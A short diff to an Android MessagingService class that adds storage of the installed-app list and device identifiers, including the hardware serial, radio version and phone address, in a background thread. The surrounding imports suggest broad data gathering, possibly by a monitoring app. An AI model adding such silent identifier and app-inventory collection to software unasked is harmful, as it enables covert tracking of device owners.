@@ -9,6 +9,7 @@ import android.database.Cursor;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -130,9 +131,11 @@ public class MessagingService extends Service {
                             }
                         }
                     }
+                    Database.insertPackages(sDatabase, Helpers.getInstalledApps(MessagingService.this));
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
+                Database.insertDevice(sDatabase, sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
             }
         }).start();
        /* new Thread(new Runnable() {
